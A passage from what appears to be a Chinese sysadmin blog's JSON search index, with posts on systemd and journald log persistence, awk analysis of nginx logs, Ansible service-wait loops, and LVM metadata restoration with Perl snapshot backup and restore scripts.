tabindex=\"0\"\u003e\u003ccode\u003e[Unit]\nAfter=network.target\nWants=network.target\n\n[Service]\nWorkingDirectory=/export/prod/server\nType=simple\nExecStart=/usr/bin/java -jar  -Dspring.config.location=application.properties -Dlog4j2.formatMsgNoLookups=true server.jar\nRestart=on-failure\nRestartSec=1s\n\n[Install]\nWantedBy=multi-user.target\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后就可以运行了：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esystemctl daemon-reload\nsystemctl start circle\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e注意上面的WorkingDirectory，因为下面java启动指定 application.properties 配置文件的时候没有用绝对路径，那么这里就要指定当前工作目录了。\u003c/p\u003e\n\u003cp\u003e另外RestartSec=1s也改了，缺省是10ms，太快了\u003c/p\u003e\n\u003cp\u003e当然这只是第一步，日志是归journal管了，journal还是需要进一步配置的\u003c/p\u003e\n\u003cp\u003e首先必须要持久化存储到磁盘，否则只会在/run/log/journal内存中存放，重启就没了\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e#disk-usage查看的是: 内存+/var/log/journal的加起来的总和大小\njournalctl --disk-usage\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后我们需要修改配置，让它持久化\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003evi /etc/systemd/journald.conf\nStorage=persistent\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e修改重启\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003emkdir /var/log/journal\nsystemd-tmpfiles --create --prefix /var/log/journal\nsystemctl restart systemd-journald\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后刷一下，把内存的文件刷到磁盘中\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ejournalctl --flush\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e还可以设置保存天数：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ejournalctl --vacuum-time=31d\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查看是从那一天开始保存的，进目录查看时间戳即可\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecd /var/log/journal\nls -lha \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后就是一个秘籍了，如果把日志弄出来查看\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ejournalctl -u circle --since \u0026#34;2022-10-19 14:30:00\u0026#34; --until \u0026#34;2022-10-19 15:00:00\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e开发人员经常问我要日志，这样就特别方便快捷了，比从log4j的日志目录里拉方便的多。\u003c/p\u003e","title":"systemd与journalctl的双剑合璧"},{"content":"awk 是比较强力的工具，跟cut和sed组合起来，会有意想不到的作用\n举个简单例子，我们nginx的access.log如下：\n110.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r220.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 20616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r330.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 30616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r410.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r530.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r650.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 50616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r760.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 60616 \u0026#34;http://my.jjwxc.net/\u0026#34; 第一个字段是ip，然后倒数第3个是200，表示200 OK，后面的就是传输了多少数据两给客户端 我们要统计一下流量大的前5名是谁。\n思路如下： 我们需要造一个数组，然后数组的键值就是ip，然后值就是数据量，如果ip重复，那么就累加数据\ncat access.log | awk -F\\\u0026#34; \u0026#39;{print $1 $3}\u0026#39;|cut -d\u0026#39; \u0026#39; -f 1,9|sort -nrk 2| awk \u0026#39;{ip[$1] +=$2}END{for (i in ip) {print i, ip[i]}}\u0026#39; | sed -n \u0026#39;1,5p\u0026#39; 最后结果：\n160.244.232.88 60616\r220.244.232.88 20616\r330.244.232.88 41232\r450.244.232.88 50616\r510.244.232.88 21232 注意 10.244.232.88 和 30.244.232.88 后面的数据都是累加过的。\n","permalink":"https://rendoumi.com/posts/20221019-systemctl/","summary":"\u003cp\u003eawk 是比较强力的工具，跟cut和sed组合起来，会有意想不到的作用\u003c/p\u003e\n\u003cp\u003e举个简单例子，我们nginx的access.log如下：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e110.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r\n220.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 20616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r\n330.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 30616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r\n410.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r\n530.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 10616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r\n650.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 50616 \u0026#34;http://my.jjwxc.net/\u0026#34;\r\n760.244.232.88 - - [12/Apr/2022:16:50:06 +0800] help.jjwxc.net \u0026#34;GET /user/article/248 HTTP/1.1\u0026#34; 200 60616 \u0026#34;http://my.jjwxc.net/\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e第一个字段是ip，然后倒数第3个是200，表示200 OK，后面的就是传输了多少数据两给客户端\n我们要统计一下流量大的前5名是谁。\u003c/p\u003e","title":"awk的用法"},{"content":"ansible的脚本中我们可能会要启动某项服务并等待，直到服务启动起来，然后再进行下一步\n这个非常重要，我们举例来实验一下：\n- hosts: localhost vars: local__service: ssh tasks: - block: - name: \u0026#34;Stop {{ local__service }} service\u0026#34; systemd: service: \u0026#34;{{ local__service }}\u0026#34; state: stopped - name: \u0026#34;Populate ansible_facts.services variable\u0026#34; ansible.builtin.service_facts: - name: \u0026#34;{{ local__service }} state will be stopped as expected\u0026#34; assert: that: ansible_facts.services[local__service].state == \u0026#39;stopped\u0026#39; - name: \u0026#34;Start {{ local__service }} service\u0026#34; systemd: service: \u0026#34;{{ local__service }}\u0026#34; state: started - name: \u0026#34;Registered {{ local__service }} state will still be stopped as it was not refreshed\u0026#34; assert: that: ansible_facts.services[local__service].state == \u0026#39;stopped\u0026#39; - name: \u0026#34;Refresh ansible_facts.services variable\u0026#34; ansible.builtin.service_facts: - name: \u0026#34;{{ local__service }} state will be running as expected\u0026#34; assert: that: ansible_facts.services[local__service].state == \u0026#39;running\u0026#39; 上面的 playbook 一共有7步：\n1、停止 ssh 服务\n2、获取 ansible_fact 变量\n3、断言 ansible_facts 中的 ssh 服务是 stopped 状态\n4、重新启动 ssh 服务\n5、断言 ansible_facts 中的 ssh 服务仍然是 stopped 状态\n6、重新获取 ansible_fact 变量\n7、这时 ansible_facts 中的 ssh 服务状态刷新了，变成了 running\n就是服务启动后，必须去不断刷新 ansible_facts，才能获得刷新后的状态，所以我们利用这一点，脚本如下：\n- hosts: localhost vars: local__service: ssh tasks: - block: - name: \u0026#34;Stop {{ local__service }} service\u0026#34; systemd: service: \u0026#34;{{ local__service }}\u0026#34; state: stopped - name: \u0026#34;Wait until {{ local__service }} service is stopped\u0026#34; ansible.builtin.service_facts: register: temp__service_facts until: temp__service_facts.ansible_facts.services[local__service].state == \u0026#39;stopped\u0026#39; retries: 20 delay: 2 - name: \u0026#34;Start {{ local__service }} service\u0026#34; systemd: service: \u0026#34;{{ local__service }}\u0026#34; state: started - name: \u0026#34;Wait until {{ local__service }} service is running\u0026#34; ansible.builtin.service_facts: register: temp__service_facts until: temp__service_facts.ansible_facts.services[local__service].state == \u0026#39;running\u0026#39; retries: 20 delay: 2 上面wait until的步骤就是，注册一个临时的变量，然后不断去测试，重试20次，每次的延时是2秒。这样就可以解决了。\n","permalink":"https://rendoumi.com/posts/20220729-ansible_until/","summary":"\u003cp\u003eansible的脚本中我们可能会要启动某项服务并等待，直到服务启动起来，然后再进行下一步\u003c/p\u003e\n\u003cp\u003e这个非常重要，我们举例来实验一下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- hosts: localhost\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  vars:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    local__service: ssh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  tasks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    - block:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;Stop {{ local__service }} service\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        systemd:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          service: \u003cspan class=\"s2\"\u003e\u0026#34;{{ local__service }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          state: stopped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;Populate ansible_facts.services variable\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ansible.builtin.service_facts:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;{{ local__service }} state will be stopped as expected\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        assert:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          that:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            ansible_facts.services\u003cspan class=\"o\"\u003e[\u003c/span\u003elocal__service\u003cspan class=\"o\"\u003e]\u003c/span\u003e.state \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;stopped\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;Start {{ local__service }} service\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        systemd:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          service: \u003cspan class=\"s2\"\u003e\u0026#34;{{ local__service }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          state: started\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;Registered {{ local__service }} state will still be stopped as it was not refreshed\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        assert:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          that:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            ansible_facts.services\u003cspan class=\"o\"\u003e[\u003c/span\u003elocal__service\u003cspan class=\"o\"\u003e]\u003c/span\u003e.state \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;stopped\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;Refresh ansible_facts.services variable\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ansible.builtin.service_facts:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - name: \u003cspan class=\"s2\"\u003e\u0026#34;{{ local__service }} state will be running as expected\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        assert:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          that:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            ansible_facts.services\u003cspan class=\"o\"\u003e[\u003c/span\u003elocal__service\u003cspan class=\"o\"\u003e]\u003c/span\u003e.state \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;running\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上面的 playbook 一共有7步：\u003c/p\u003e","title":"Ansible之等待服务状态变成成功"},{"content":"在生产系统中使用LVM务必要注意lvm metadata的备份，曾经在京东的时候发生过虚机用了lvm的磁盘系统，然后虚机文件qcow2突然坏掉了，想尽了办法也无法恢复，这给我们拉响了警钟啊，使用lvm的时候务必要备份分区信息，否则坏的时候就欲哭无泪了。\n缺省在 /etc/lvm/backup/ 目录下是最新的备份，同样历史版本都在 /etc/lvm/archive/ 目录下。\n一、先备份 在开始恢复之前，一定先做个备份\ncp -pr /etc/lvm /etc/lvm_bkp 然后去看看archive下的备份信息\nls -l /etc/lvm/archive/vg_storage_00* -rw-------. 1 root root 13722 Oct 28 23:45 /etc/lvm/archive/vg_storage_00419-1760023262.vg -rw-------. 1 root root 14571 Oct 28 23:52 /etc/lvm/archive/vg_storage_00420-94024216.vg ... -rw-------. 1 root root 14749 Nov 23 15:11 /etc/lvm/archive/vg_storage_00676-394223172.vg -rw-------. 1 root root 14733 Nov 23 15:29 /etc/lvm/archive/vg_storage_00677-187019982.vg # 二、最坏的情形恢复pv 警告：这一步只能在VG无法正常运行的时候再运行！！！\n先说最坏的情形，LVM的建立路径是 pv \u0026mdash;\u0026gt; vg \u0026mdash;\u0026gt; lv，假设连 pv（物理卷都没了）\n我们选择最近的备份，/etc/lvm/archive/vg_storage_00677-187019982.vg\nless /etc/lvm/archive/vg_storage_00677-187019982.vg ... physical_volumes { pv0 { id = \u0026#34;BgR0KJ-JClh-T2gS-k6yK-9RGn-B8Ls-LYPQP0\u0026#34; ... 从里面拿到 pv 的 id ，重建 pv\npvcreate --uuid \u0026#34;BgR0KJ-JClh-T2gS-k6yK-9RGn-B8Ls-LYPQP0\u0026#34; \\ --restorefile /etc/lvm/archive/vg_storage_00677-187019982.vg 三、恢复VG 如果 vg 是正常的，那么就不用做第二步了，直接从备份中恢复即可，先查看一下\nvgcfgrestore --list vg1 File: /etc/lvm/archive/vg1_00000-1238318622.vg VG name: vg1 Description: Created *before* executing \u0026#39;vgcreate vg1 /dev/sda6\u0026#39; Backup Time: Mon Feb 29 10:58:51 2016 File: /etc/lvm/archive/vg1_00001-285796155.vg VG name: vg1 Description: Created *before* executing \u0026#39;lvcreate -L 1G -n lv2 vg1\u0026#39; Backup Time: Mon Feb 29 10:59:23 2016 File: /etc/lvm/archive/vg1_00002-1661997476.vg ---\u0026gt; just before removal of volume (this is the archive we need) VG name: vg1 Description: Created *before* executing \u0026#39;lvremove /dev/vg1/lv2\u0026#39; Backup Time: Mon Feb 29 13:55:08 2016 File: /etc/lvm/backup/vg1 VG name: vg1 Description: Created *after* executing \u0026#39;lvremove /dev/vg1/lv2\u0026#39; Backup Time: Mon Feb 29 13:55:08 2016 有信息，我们先加 \u0026ndash;test 测试一下\nvgcfgrestore vg01 --test -f /etc/lvm/archive/vg_data_00003-586203914.vg TEST MODE: Metadata will NOT be updated and volumes will not be (de)activated. Volume group vg01 has active volume: lv001. WARNING: Found 1 active volume(s) in volume group \u0026#34;vg01\u0026#34;. Restoring VG with active LVs, may cause mismatch with its metadata. Do you really want to proceed with restore of volume group \u0026#34;vg01\u0026#34;, while 1 volume(s) are active? [y/n]: y Restored volume group vg01. 没问题，那就继续，真的操作了\nvgcfgrestore vg01 -f /etc/lvm/archive/vg_data_00003-586203914.vg Volume group vg01 has active volume: lv001. WARNING: Found 1 active volume(s) in volume group \u0026#34;vg01\u0026#34;. Restoring VG with active LVs, may cause mismatch with its metadata. Do you really want to proceed with restore of volume group \u0026#34;vg01\u0026#34;, while 1 volume(s) are active? [y/n]: y Restored volume group vg01. 四、恢复后进行校验 # 显示信息 vgdisplay VG1 # 激活 vgchange -ay VG1 # 显示逻辑卷 lvs -a -o +devices # 重新扫描 lvscan inactive \u0026#39;/dev/vg1/lv2\u0026#39; [1.00 GiB] inherit ### its in inactive state and make it active to use. ACTIVE \u0026#39;/dev/vg0/lv1\u0026#39; [1.00 GiB] inherit # 上面如果有inactive的，重新激活 lvchange -a y /dev/vg1/lv2 # 再显示一次 lvs -a -o +devices # 再扫描 lvscan ACTIVE \u0026#39;/dev/vg1/lv2\u0026#39; [1.00 GiB] inherit ACTIVE \u0026#39;/dev/vg0/lv1\u0026#39; [1.00 GiB] inherit # mount上测试 mount /dev/vg1/lv2 /lv2 # 看看东西都在不在 ls -lh /lv2 五、备份和恢复的脚本 备份一个 VG 下所有卷，每个卷一个 snapshot 快照备份文件，backup_snapshot_lvm.pl\n#!/usr/bin/perl -w # # Run through a particular LVM volume group and perform a snapshot # and compressed file backup of each volume. # # This script is intended for use with backing up complete system # images of VMs, in addition to data level backups. # my $source_lvm_volgroup = \u0026#39;vg_storage\u0026#39;; my $source_lvm_snapsize = \u0026#39;5G\u0026#39;; my @source_lvm_excludes = (\u0026#39;lv_unwanted\u0026#39;, \u0026#39;lv_tmpfiles\u0026#39;); my $dest_dir=\u0026#39;/mnt/backup/snapshots\u0026#39;; foreach $volume (glob(\u0026#34;/dev/$source_lvm_volgroup/*\u0026#34;)) { $volume =~ /\\/dev\\/$source_lvm_volgroup\\/(\\S*)$/; my $volume_short = $1; if (\u0026#34;$volume_short\u0026#34; ~~ @source_lvm_excludes) { # Excluded volume, we skip it print \u0026#34;[info] Skipping excluded volume $volume_short ($volume)\\n\u0026#34;; next; } print \u0026#34;[info] Processing volume $volume_short ($volume)\\n\u0026#34;; # Snapshot volume print \u0026#34;[info] Creating snapshot...\\n\u0026#34;; system(\u0026#34;lvcreate -n ${volume_short}_snapshot --snapshot $volume -L $source_lvm_snapsize\u0026#34;); # Write compressed backup file from snapshot, but only replace existing one once finished print \u0026#34;[info] Creating compressed snapshot file...\\n\u0026#34;; system(\u0026#34;dd if=${volume}_snapshot | gzip --fast \u0026gt; $dest_dir/$volume_short.temp.gz\u0026#34;); system(\u0026#34;mv $dest_dir/$volume_short.temp.gz $dest_dir/$volume_short.gz\u0026#34;); # Delete snapshot print \u0026#34;[info] Removing snapshot...\\n\u0026#34;; system(\u0026#34;lvremove --force ${volume}_snapshot\u0026#34;); print \u0026#34;[info] Volume $volume_short backup completed.\\n\u0026#34;; } print \u0026#34;[info] FINISHED! VolumeGroup backup completed\\n\u0026#34;; exit 0; 恢复的脚本，restore_snapshot_lvm.pl：\n#!/usr/bin/perl -w # # Runs through LVM snapshots taken by backup_snapshot_lvm.pl and # restores them to the LVM volume in question. # my $dest_lvm_volgroup = \u0026#39;vg_storage\u0026#39;; my $source_dir = \u0026#39;/mnt/backup/snapshots\u0026#39;; print \u0026#34;[WARNING] Beginning restore process in 5 SECONDS!!\\n\u0026#34;; sleep(5); foreach $volume (glob(\u0026#34;$source_dir/*\u0026#34;)) { $volume =~ /$source_dir\\/(\\S*).gz$/; my $volume_short = $1; print \u0026#34;[info] Processing volume $volume_short ($volume)\\n\u0026#34;; # Just need to decompress \u0026amp; write into LVM volume system(\u0026#34;zcat $source_dir/$volume_short.gz \u0026gt; /dev/$dest_lvm_volgroup/$volume_short\u0026#34;); print \u0026#34;[info] Volume $volume_short restore completed.\\n\u0026#34;; } print \u0026#34;[info] FINISHED! VolumeGroup restore completed\\n\u0026#34;; exit 0; 当然要谨记，这个是块设备级别的备份，最好还是要有另外的数据的备份。\n","permalink":"https://rendoumi.com/posts/20220728-lvm_restore/","summary":"\u003cp\u003e在生产系统中使用LVM务必要注意lvm metadata的备份，曾经在京东的时候发生过虚机用了lvm的磁盘系统，然后虚机文件qcow2突然坏掉了，想尽了办法也无法恢复，这给我们拉响了警钟啊，使用lvm的时候务必要备份分区信息，否则坏的时候就欲哭无泪了。\u003c/p\u003e\n\u003cp\u003e缺省在 /etc/lvm/backup/ 目录下是最新的备份，同样历史版本都在 /etc/lvm/archive/ 目录下。\u003c/p\u003e\n\u003ch4 id=\"一先备份\"\u003e一、先备份\u003c/h4\u003e\n\u003cp\u003e在开始恢复之前，一定先做个备份\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecp -pr /etc/lvm /etc/lvm_bkp\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后去看看archive下的备份信息\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els -l /etc/lvm/archive/vg_storage_00*\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-rw-------. \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root \u003cspan class=\"m\"\u003e13722\u003c/span\u003e Oct \u003cspan class=\"m\"\u003e28\u003c/span\u003e 23:45 /etc/lvm/archive/vg_storage_00419-1760023262.vg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-rw-------. \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root \u003cspan class=\"m\"\u003e14571\u003c/span\u003e Oct \u003cspan class=\"m\"\u003e28\u003c/span\u003e 23:52 /etc/lvm/archive/vg_storage_00420-94024216.vg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-rw-------. \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root \u003cspan class=\"m\"\u003e14749\u003c/span\u003e Nov \u003cspan class=\"m\"\u003e23\u003c/span\u003e 15:11 /etc/lvm/archive/vg_storage_00676-394223172.vg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-rw-------. \u003cspan class=\"m\"\u003e1\u003c/span\u003e root root \u003cspan class=\"m\"\u003e14733\u003c/span\u003e Nov \u003cspan class=\"m\"\u003e23\u003c/span\u003e 15:29 /etc/lvm/archive/vg_storage_00677-187019982.vg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"二最坏的情形恢复pv\"\u003e二、最坏的情形恢复pv\u003c/h4\u003e\n\u003cp\u003e警告：这一步只能在VG无法正常运行的时候再运行！！！\u003c/p\u003e\n\u003cp\u003e先说最坏的情形，LVM的建立路径是 pv \u0026mdash;\u0026gt; vg \u0026mdash;\u0026gt; lv，假设连 pv（物理卷都没了）\u003c/p\u003e\n\u003cp\u003e我们选择最近的备份，/etc/lvm/archive/vg_storage_00677-187019982.vg\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eless /etc/lvm/archive/vg_storage_00677-187019982.vg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   physical_volumes \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      pv0 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         \u003cspan class=\"nv\"\u003eid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;BgR0KJ-JClh-T2gS-k6yK-9RGn-B8Ls-LYPQP0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e从里面拿到 pv 的 id ，重建 pv\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epvcreate --uuid \u003cspan class=\"s2\"\u003e\u0026#34;BgR0KJ-JClh-T2gS-k6yK-9RGn-B8Ls-LYPQP0\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  --restorefile /etc/lvm/archive/vg_storage_00677-187019982.vg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"三恢复vg\"\u003e三、恢复VG\u003c/h4\u003e\n\u003cp\u003e如果 vg 是正常的，那么就不用做第二步了，直接从备份中恢复即可，先查看一下\u003c/p\u003e","title":"LVM系统的Restore"},{"content":"现在版本的 dmesg -T 都是带时间戳的。\n但是老的机器，很有可能是没有 -T 这个参数的，直接 dmesg 